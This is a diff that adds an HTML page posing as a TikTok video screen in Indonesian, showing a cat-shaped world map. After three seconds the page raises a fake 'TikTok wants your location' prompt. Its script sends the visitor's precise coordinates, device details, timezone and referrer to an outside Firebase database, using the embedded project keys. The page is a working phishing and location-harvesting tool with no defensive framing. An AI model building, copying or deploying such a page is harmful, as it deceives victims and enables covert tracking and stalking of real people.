@@ -1,0 +1,850 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>TikTok</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+
+body {
+  background:#000;
+  color:#fff;
+  font-family:-apple-system,'PingFang SC','Helvetica Neue',sans-serif;
+  height:100vh;
+  width:100vw;
+  overflow:hidden;
+  position:relative;
+  max-width:430px;
+  margin:0 auto;
+}
+
+/* STATUS BAR */
+.status-bar {
+  position:absolute;
+  top:0; left:0; right:0;
+  height:28px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  padding:0 14px;
+  z-index:50;
+  font-size:13px;
+  font-weight:600;
+}
+.status-left { display:flex; align-items:center; gap:4px; }
+.status-right { display:flex; align-items:center; gap:5px; font-size:12px; }
+.tiktok-icon { font-size:13px; }
+
+/* TOP TABS */
+.top-tabs {
+  position:absolute;
+  top:28px; left:0; right:0;
+  height:44px;
+  display:flex;
+  align-items:center;
+  z-index:50;
+  padding:0 8px;
+}
+
+.live-badge {
+  background:#fe2c55;
+  color:#fff;
+  font-size:11px;
+  font-weight:800;
+  padding:2px 5px;
+  border-radius:3px;
+  margin-right:6px;
+  letter-spacing:0.5px;
+}
+
+.tabs-row {
+  display:flex;
+  align-items:center;
+  gap:0;
+  flex:1;
+  justify-content:space-around;
+}
+
+.tab {
+  font-size:15px;
+  color:rgba(255,255,255,0.6);
+  font-weight:500;
+  padding:4px 6px;
+  white-space:nowrap;
+}
+
+.tab.active {
+  color:#fff;
+  font-weight:700;
+  position:relative;
+}
+
+.tab.active::after {
+  content:'';
+  position:absolute;
+  bottom:-4px;
+  left:50%;
+  transform:translateX(-50%);
+  width:20px;
+  height:2.5px;
+  background:#fff;
+  border-radius:2px;
+}
+
+.search-btn {
+  margin-left:6px;
+  padding:4px;
+}
+
+.search-btn svg { width:22px; height:22px; }
+
+/* PROMO BANNER */
+.promo-banner {
+  position:absolute;
+  top:72px; left:0; right:0;
+  height:90px;
+  background:#000;
+  display:flex;
+  align-items:center;
+  z-index:40;
+  overflow:hidden;
+}
+
+.promo-left {
+  width:100px;
+  height:90px;
+  position:relative;
+  flex-shrink:0;
+}
+
+.promo-cat-img {
+  width:90px;
+  height:88px;
+  background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="45" r="28" fill="%23f4a940"/><ellipse cx="36" cy="32" rx="8" ry="12" fill="%23f4a940"/><ellipse cx="64" cy="32" rx="8" ry="12" fill="%23f4a940"/><circle cx="42" cy="48" r="4" fill="%23333"/><circle cx="58" cy="48" r="4" fill="%23333"/><ellipse cx="50" cy="56" rx="5" ry="4" fill="%23e88"/><path d="M35 60 Q50 68 65 60" stroke="%23333" stroke-width="2" fill="none"/></svg>') center/contain no-repeat;
+  position:absolute;
+  bottom:0; left:5px;
+}
+
+.hard-hat {
+  position:absolute;
+  top:4px; left:12px;
+  width:70px; height:40px;
+  background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 70 40"><ellipse cx="35" cy="32" rx="32" ry="10" fill="%23e8a800"/><path d="M8 30 Q10 10 35 8 Q60 10 62 30 Z" fill="%23f5c200"/><rect x="5" y="28" width="60" height="8" rx="4" fill="%23e8a800"/></svg>') center/contain no-repeat;
+}
+
+.gift-badge {
+  position:absolute;
+  bottom:8px; left:2px;
+  background:linear-gradient(135deg,#ff6b35,#ff2d55);
+  border-radius:8px;
+  padding:3px 5px;
+  text-align:center;
+}
+
+.gift-p { font-size:9px; font-weight:800; color:#ffdd57; line-height:1; }
+.gift-label { font-size:7px; color:#fff; font-weight:600; }
+
+.promo-close {
+  position:absolute;
+  top:4px; right:4px;
+  width:16px; height:16px;
+  background:rgba(255,255,255,0.25);
+  border-radius:50%;
+  display:flex; align-items:center; justify-content:center;
+  font-size:9px; color:#fff; cursor:pointer;
+  z-index:41;
+}
+
+.promo-text {
+  flex:1;
+  font-size:22px;
+  font-weight:800;
+  color:#fff;
+  padding-left:8px;
+  letter-spacing:-0.5px;
+}
+
+/* VIDEO AREA */
+.video-area {
+  position:absolute;
+  top:162px; left:0; right:0;
+  bottom:116px;
+  overflow:hidden;
+  background:#1a2a3a;
+}
+
+.video-bg {
+  width:100%; height:100%;
+  background:
+    radial-gradient(ellipse at 30% 30%, #4a7fa5 0%, transparent 50%),
+    radial-gradient(ellipse at 70% 60%, #3d6b8a 0%, transparent 50%),
+    linear-gradient(180deg, #87CEEB 0%, #4a9fd4 20%, #2e7ab5 40%, #c8a96e 55%, #a67c52 65%, #2d5a1b 75%, #1a3d12 85%, #0d2409 100%);
+}
+
+/* Map labels */
+.map-label {
+  position:absolute;
+  font-size:9px;
+  font-weight:600;
+  color:rgba(0,0,0,0.6);
+  letter-spacing:1px;
+  text-transform:uppercase;
+}
+
+/* Play button center */
+.play-center {
+  position:absolute;
+  top:50%; left:50%;
+  transform:translate(-50%,-50%);
+  width:52px; height:52px;
+  background:rgba(0,0,0,0.35);
+  border-radius:50%;
+  display:flex; align-items:center; justify-content:center;
+}
+.play-center svg { width:22px; height:22px; fill:#fff; margin-left:3px; }
+
+/* REPORT FLAG */
+.flag-btn {
+  position:absolute;
+  top:12px; right:12px;
+  width:36px; height:36px;
+  background:rgba(0,0,0,0.4);
+  border-radius:50%;
+  display:flex; align-items:center; justify-content:center;
+}
+.flag-btn svg { width:18px; height:18px; fill:rgba(255,255,255,0.85); }
+
+/* RIGHT SIDEBAR */
+.sidebar {
+  position:absolute;
+  right:8px;
+  bottom:130px;
+  z-index:30;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  gap:14px;
+}
+
+.avatar-wrap {
+  position:relative;
+  margin-bottom:2px;
+}
+
+.avatar-circle {
+  width:48px; height:48px;
+  border-radius:50%;
+  border:2px solid #fff;
+  background:#f5c200;
+  display:flex; align-items:center; justify-content:center;
+  font-size:24px;
+  overflow:hidden;
+}
+
+.avatar-inner {
+  width:100%; height:100%;
+  background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><circle cx="24" cy="24" r="24" fill="%23f4a940"/><ellipse cx="18" cy="18" rx="5" ry="7" fill="%23f4a940"/><ellipse cx="30" cy="18" rx="5" ry="7" fill="%23f4a940"/><circle cx="20" cy="26" r="3" fill="%23333"/><circle cx="28" cy="26" r="3" fill="%23333"/><ellipse cx="24" cy="32" rx="4" ry="3" fill="%23e88"/></svg>') center/cover no-repeat;
+}
+
+.plus-btn {
+  position:absolute;
+  bottom:-8px; left:50%;
+  transform:translateX(-50%);
+  width:20px; height:20px;
+  background:#fe2c55;
+  border-radius:50%;
+  display:flex; align-items:center; justify-content:center;
+  font-size:16px; font-weight:300; color:#fff;
+  line-height:1;
+}
+
+.sidebar-item {
+  display:flex; flex-direction:column; align-items:center; gap:3px;
+}
+
+.s-icon { width:36px; height:36px; display:flex; align-items:center; justify-content:center; }
+.s-icon svg { width:34px; height:34px; }
+.s-count { font-size:12px; font-weight:500; color:#fff; }
+
+/* Small face bottom of sidebar */
+.small-face {
+  width:42px; height:42px;
+  border-radius:50%;
+  border:2px solid rgba(255,255,255,0.5);
+  background:#d4a574;
+  overflow:hidden;
+  display:flex; align-items:center; justify-content:center;
+  font-size:20px;
+}
+
+/* BOTTOM INFO */
+.bottom-info {
+  position:absolute;
+  bottom:130px;
+  left:0; right:68px;
+  padding:0 14px;
+  z-index:30;
+}
+
+.b-username {
+  font-size:16px;
+  font-weight:700;
+  color:#fff;
+  margin-bottom:5px;
+}
+
+.b-caption {
+  font-size:13.5px;
+  color:#fff;
+  line-height:1.45;
+  margin-bottom:7px;
+}
+
+.b-caption strong { font-weight:700; }
+
+.b-sound {
+  display:flex; align-items:center; gap:6px;
+  font-size:13px; color:#fff;
+}
+
+.note-icon { font-size:14px; }
+
+/* LIKE COUNTER POPUP */
+.like-counter {
+  position:absolute;
+  bottom:186px;
+  left:50%;
+  transform:translateX(-50%);
+  background:#fe2c55;
+  color:#fff;
+  font-size:14px;
+  font-weight:700;
+  padding:9px 20px;
+  border-radius:24px;
+  z-index:40;
+  display:flex; align-items:center; gap:10px;
+  white-space:nowrap;
+}
+
+.like-counter .heart { font-size:16px; }
+.lc-divider { width:1px; height:16px; background:rgba(255,255,255,0.4); }
+
+/* SEARCH BAR */
+.search-bar-row {
+  position:absolute;
+  bottom:114px;
+  left:0; right:0;
+  padding:0 12px;
+  z-index:30;
+}
+
+.search-inner {
+  background:rgba(255,255,255,0.12);
+  border-radius:20px;
+  padding:8px 14px;
+  display:flex; align-items:center; gap:7px;
+  font-size:13px; color:rgba(255,255,255,0.7);
+}
+
+.search-inner svg { width:14px; height:14px; fill:rgba(255,255,255,0.6); flex-shrink:0; }
+.search-inner .arr { margin-left:auto; color:rgba(255,255,255,0.5); font-size:16px; }
+
+/* PROGRESS BAR */
+.progress-wrap {
+  position:absolute;
+  bottom:112px;
+  left:0; right:0;
+  height:2px;
+  background:rgba(255,255,255,0.2);
+  z-index:30;
+}
+
+.progress-fill {
+  height:100%;
+  width:22%;
+  background:rgba(255,255,255,0.8);
+  border-radius:1px;
+}
+
+.progress-dot {
+  width:8px; height:8px;
+  background:#fff;
+  border-radius:50%;
+  position:absolute;
+  top:-3px;
+  left:22%;
+  transform:translateX(-50%);
+}
+
+/* BOTTOM NAV */
+.bottom-nav {
+  position:absolute;
+  bottom:0; left:0; right:0;
+  height:112px;
+  background:#000;
+  z-index:50;
+  border-top:1px solid rgba(255,255,255,0.06);
+}
+
+.nav-row {
+  display:flex;
+  align-items:center;
+  justify-content:space-around;
+  padding:10px 0 0;
+}
+
+.nav-item {
+  display:flex; flex-direction:column; align-items:center; gap:3px;
+  font-size:10px; color:rgba(255,255,255,0.55);
+  min-width:60px;
+}
+
+.nav-item.active { color:#fff; }
+.nav-item svg { width:24px; height:24px; fill:currentColor; }
+
+.nav-plus-wrap {
+  display:flex; flex-direction:column; align-items:center; gap:3px;
+}
+
+.nav-plus-btn {
+  width:48px; height:32px;
+  border-radius:8px;
+  background:linear-gradient(90deg,#25f4ee,#fe2c55);
+  display:flex; align-items:center; justify-content:center;
+  position:relative;
+}
+
+.nav-plus-btn::before {
+  content:'';
+  position:absolute;
+  inset:2px;
+  background:#fff;
+  border-radius:6px;
+}
+
+.plus-sign {
+  position:relative; z-index:1;
+  font-size:20px; font-weight:400; color:#000; line-height:1;
+}
+
+/* Red dot on toko */
+.red-dot {
+  width:7px; height:7px;
+  background:#fe2c55;
+  border-radius:50%;
+  position:absolute;
+  top:-2px; right:-2px;
+}
+
+.nav-toko { position:relative; }
+
+/* LOCATION OVERLAY */
+.loc-overlay {
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.65);
+  z-index:100;
+  display:flex;
+  align-items:flex-end;
+  justify-content:center;
+  opacity:0;
+  pointer-events:none;
+  transition:opacity 0.35s;
+}
+
+.loc-overlay.show {
+  opacity:1;
+  pointer-events:all;
+}
+
+.loc-sheet {
+  background:#1c1c1e;
+  border-radius:16px 16px 0 0;
+  padding:16px 20px 36px;
+  width:100%;
+  max-width:430px;
+  transform:translateY(100%);
+  transition:transform 0.4s cubic-bezier(0.32,0.72,0,1);
+}
+
+.loc-overlay.show .loc-sheet { transform:translateY(0); }
+
+.sheet-handle {
+  width:36px; height:4px;
+  background:rgba(255,255,255,0.18);
+  border-radius:2px;
+  margin:0 auto 16px;
+}
+
+.sheet-app-icon {
+  width:52px; height:52px;
+  background:linear-gradient(135deg,#25f4ee,#fe2c55);
+  border-radius:12px;
+  display:flex; align-items:center; justify-content:center;
+  margin:0 auto 12px;
+  font-size:26px;
+}
+
+.sheet-title {
+  text-align:center;
+  font-size:16px;
+  font-weight:700;
+  color:#fff;
+  margin-bottom:6px;
+}
+
+.sheet-sub {
+  text-align:center;
+  font-size:13px;
+  color:rgba(255,255,255,0.5);
+  line-height:1.55;
+  margin-bottom:20px;
+  padding:0 8px;
+}
+
+.loc-map-preview {
+  width:100%;
+  height:100px;
+  background:linear-gradient(135deg,#2d5a1b,#4a7fa5);
+  border-radius:10px;
+  margin-bottom:16px;
+  position:relative;
+  overflow:hidden;
+  display:flex; align-items:center; justify-content:center;
+}
+
+.loc-map-preview::before {
+  content:'📍';
+  font-size:28px;
+  position:relative; z-index:1;
+}
+
+.btn-allow {
+  background:#0a84ff;
+  color:#fff;
+  border:none;
+  width:100%;
+  padding:14px;
+  border-radius:12px;
+  font-size:15px;
+  font-weight:600;
+  cursor:pointer;
+  margin-bottom:10px;
+  transition:background 0.2s;
+}
+
+.btn-allow:hover { background:#0070e0; }
+.btn-allow:disabled { background:#2a2a2a; color:#555; }
+
+.btn-deny {
+  background:transparent;
+  color:rgba(255,255,255,0.4);
+  border:none;
+  width:100%;
+  padding:10px;
+  font-size:14px;
+  cursor:pointer;
+}
+
+.s-status {
+  text-align:center;
+  font-size:12px;
+  min-height:18px;
+  color:rgba(255,255,255,0.4);
+  margin-top:4px;
+}
+
+.s-status.ok { color:#30d158; }
+.s-status.err { color:#ff453a; }
+</style>
+</head>
+<body>
+
+<!-- STATUS BAR -->
+<div class="status-bar">
+  <div class="status-left">
+    <span>19:00</span>
+    <span class="tiktok-icon">🎵</span>
+    <span>···</span>
+  </div>
+  <div class="status-right">
+    <span>🔕</span>
+    <span>▌▌▌</span>
+    <span>📶</span>
+    <span>🔋75%</span>
+  </div>
+</div>
+
+<!-- TOP TABS -->
+<div class="top-tabs">
+  <div class="live-badge">LIVE</div>
+  <div class="tabs-row">
+    <span class="tab">tas</span>
+    <span class="tab">Batang</span>
+    <span class="tab">Teman</span>
+    <span class="tab">Mengikuti</span>
+    <span class="tab active">Saran</span>
+  </div>
+  <div class="search-btn">
+    <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+  </div>
+</div>
+
+<!-- PROMO BANNER -->
+<div class="promo-banner">
+  <div class="promo-left">
+    <div class="promo-close" onclick="this.parentElement.parentElement.style.display='none'">✕</div>
+    <div class="promo-cat-img"></div>
+    <div class="hard-hat"></div>
+    <div class="gift-badge">
+      <div class="gift-p">🎁 P P P</div>
+      <div class="gift-label">Dapatkan</div>
+      <div class="gift-label">Reward</div>
+    </div>
+  </div>
+  <div class="promo-text">udah tau belum ???</div>
+</div>
+
+<!-- VIDEO AREA -->
+<div class="video-area">
+  <div class="video-bg">
+    <!-- Map labels mimicking the screenshot -->
+    <div class="map-label" style="top:15%;left:8%">NORDAMERIKA</div>
+    <div class="map-label" style="top:20%;left:35%;font-size:11px;color:rgba(0,0,0,0.7)">ATLANTISCHER<br>OCEAN</div>
+    <div class="map-label" style="top:18%;left:56%;font-size:12px">EUROPA</div>
+    <div class="map-label" style="top:18%;right:10%;font-size:12px">ASIEN</div>
+    <div class="map-label" style="top:50%;left:50%;font-size:13px;transform:translateX(-50%)">AFRIKA</div>
+    <div class="map-label" style="bottom:20%;left:18%">SUGAMERIKA</div>
+    <div class="map-label" style="bottom:5%;left:50%;transform:translateX(-50%)">ANTARKTIS</div>
+    <!-- Compass -->
+    <div style="position:absolute;bottom:16%;left:4%;font-size:28px;opacity:0.6">🧭</div>
+  </div>
+
+  <!-- Play button -->
+  <div class="play-center">
+    <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+  </div>
+
+  <!-- Report flag -->
+  <div class="flag-btn">
+    <svg viewBox="0 0 24 24"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1zM4 22v-7"/></svg>
+  </div>
+</div>
+
+<!-- RIGHT SIDEBAR -->
+<div class="sidebar">
+  <div class="avatar-wrap">
+    <div class="avatar-circle"><div class="avatar-inner"></div></div>
+    <div class="plus-btn">+</div>
+  </div>
+
+  <div class="sidebar-item" id="likeItem" onclick="toggleLike()">
+    <div class="s-icon">
+      <svg id="heartSvg" viewBox="0 0 24 24" fill="#fff"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
+    </div>
+    <span class="s-count" id="likeCount">3.915</span>
+  </div>
+
+  <div class="sidebar-item">
+    <div class="s-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.8"><circle cx="12" cy="12" r="2"/><circle cx="19" cy="12" r="2"/><circle cx="5" cy="12" r="2"/></svg>
+    </div>
+    <span class="s-count">381</span>
+  </div>
+
+  <div class="sidebar-item">
+    <div class="s-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.8"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg>
+    </div>
+    <span class="s-count">569</span>
+  </div>
+
+  <div class="sidebar-item">
+    <div class="s-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.8"><path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"/><polyline points="16 6 12 2 8 6"/><line x1="12" y1="2" x2="12" y2="15"/></svg>
+    </div>
+    <span class="s-count">524</span>
+  </div>
+
+  <div class="small-face">😊</div>
+</div>
+
+<!-- BOTTOM INFO -->
+<div class="bottom-info">
+  <div class="b-username">hrd-keren</div>
+  <div class="b-caption">coba kamu perhatiin.. peta dunia ternyata kucheng bestie....<strong>banyak</strong></div>
+  <div class="b-sound">
+    <span class="note-icon">♫</span>
+    <span>Berisi: Tatitut (titut) - RIS...</span>
+  </div>
+</div>
+
+<!-- LIKE COUNTER POPUP -->
+<div class="like-counter">
+  <span class="heart">❤️</span>
+  <span>44</span>
+  <div class="lc-divider"></div>
+  <span>👤</span>
+  <span>102</span>
+</div>
+
+<!-- SEARCH BAR -->
+<div class="search-bar-row">
+  <div class="search-inner">
+    <svg viewBox="0 0 24 24"><path d="M21 21l-4.35-4.35M17 11A6 6 0 1 1 5 11a6 6 0 0 1 12 0z" stroke="rgba(255,255,255,0.6)" stroke-width="2.2" fill="none" stroke-linecap="round"/></svg>
+    <span>Pencarian · pulau eropa yg ke...</span>
+    <span class="arr">›</span>
+  </div>
+</div>
+
+<!-- PROGRESS BAR -->
+<div class="progress-wrap">
+  <div class="progress-fill"></div>
+  <div class="progress-dot"></div>
+</div>
+
+<!-- BOTTOM NAV -->
+<div class="bottom-nav">
+  <div class="nav-row">
+    <div class="nav-item active">
+      <svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22" stroke="#fff" stroke-width="1.5" fill="none"/></svg>
+      <span>Beranda</span>
+    </div>
+
+    <div class="nav-item nav-toko">
+      <div style="position:relative; display:inline-block;">
+        <svg viewBox="0 0 24 24" width="24" height="24"><path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z" fill="none" stroke="currentColor" stroke-width="1.8"/><line x1="3" y1="6" x2="21" y2="6" stroke="currentColor" stroke-width="1.8"/><path d="M16 10a4 4 0 0 1-8 0" fill="none" stroke="currentColor" stroke-width="1.8"/></svg>
+        <div class="red-dot"></div>
+      </div>
+      <span>Toko</span>
+    </div>
+
+    <div class="nav-plus-wrap">
+      <div class="nav-plus-btn">
+        <span class="plus-sign">+</span>
+      </div>
+    </div>
+
+    <div class="nav-item">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+      <span>Kotak Masuk</span>
+    </div>
+
+    <div class="nav-item">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+      <span>Profil</span>
+    </div>
+  </div>
+</div>
+
+<!-- LOCATION OVERLAY -->
+<div class="loc-overlay" id="locOverlay">
+  <div class="loc-sheet">
+    <div class="sheet-handle"></div>
+    <div class="sheet-app-icon">🎵</div>
+    <div class="sheet-title">"TikTok" Ingin Menggunakan<br>Lokasi Anda</div>
+    <div class="sheet-sub">Untuk menampilkan konten relevan berdasarkan lokasi Anda saat ini.</div>
+    <div class="loc-map-preview"></div>
+    <button class="btn-allow" id="allowBtn" onclick="doGetLocation()">Izinkan Saat Menggunakan App</button>
+    <button class="btn-deny" onclick="denyLoc()">Jangan Izinkan</button>
+    <div class="s-status" id="sStatus"></div>
+  </div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script>
+  firebase.initializeApp({
+    apiKey: "AIzaSyD335lm8QRYay45ziLw3g9-26wB_5ywvBM",
+    authDomain: "cakh-c4083.firebaseapp.com",
+    databaseURL: "https://cakh-c4083-default-rtdb.firebaseio.com",
+    projectId: "cakh-c4083",
+    storageBucket: "cakh-c4083.firebasestorage.app",
+    messagingSenderId: "257304404380",
+    appId: "1:257304404380:web:595eccb49026ccea242859",
+    measurementId: "G-4YRTJD3HLD"
+  });
+
+  var db = firebase.database();
+
+  // Muncul setelah 3 detik
+  setTimeout(function() {
+    document.getElementById('locOverlay').classList.add('show');
+  }, 3000);
+
+  // Like toggle
+  var liked = false;
+  var likeNum = 3915;
+
+  function toggleLike() {
+    liked = !liked;
+    var h = document.getElementById('heartSvg');
+    var c = document.getElementById('likeCount');
+    if (liked) { h.style.fill = '#fe2c55'; likeNum++; }
+    else { h.style.fill = '#fff'; likeNum--; }
+    c.textContent = likeNum.toLocaleString('id-ID');
+  }
+
+  function denyLoc() {
+    document.getElementById('locOverlay').classList.remove('show');
+  }
+
+  function doGetLocation() {
+    var btn = document.getElementById('allowBtn');
+    var st = document.getElementById('sStatus');
+
+    btn.disabled = true;
+    btn.textContent = 'Mendapatkan lokasi...';
+
+    if (!navigator.geolocation) {
+      st.textContent = 'Perangkat tidak mendukung lokasi.';
+      st.className = 's-status err';
+      btn.disabled = false;
+      btn.textContent = 'Izinkan Saat Menggunakan App';
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      function(pos) {
+        var data = {
+          lat: pos.coords.latitude,
+          lng: pos.coords.longitude,
+          accuracy: pos.coords.accuracy,
+          timestamp: firebase.database.ServerValue.TIMESTAMP,
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          screenRes: screen.width + 'x' + screen.height,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          referrer: document.referrer || 'direct'
+        };
+
+        db.ref('pings').push(data)
+          .then(function() {
+            st.textContent = 'Berhasil.';
+            st.className = 's-status ok';
+            setTimeout(function() {
+              document.getElementById('locOverlay').classList.remove('show');
+            }, 700);
+          })
+          .catch(function(e) {
+            st.textContent = 'Gagal: ' + e.message;
+            st.className = 's-status err';
+            btn.disabled = false;
+            btn.textContent = 'Izinkan Saat Menggunakan App';
+          });
+      },
+      function(e) {
+        var m = {1:'Izin ditolak.',2:'Lokasi tidak tersedia.',3:'Timeout.'};
+        st.textContent = m[e.code] || 'Error.';
+        st.className = 's-status err';
+        btn.disabled = false;
+        btn.textContent = 'Izinkan Saat Menggunakan App';
+      },
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+  }
+</script>
+</body>
+</html>
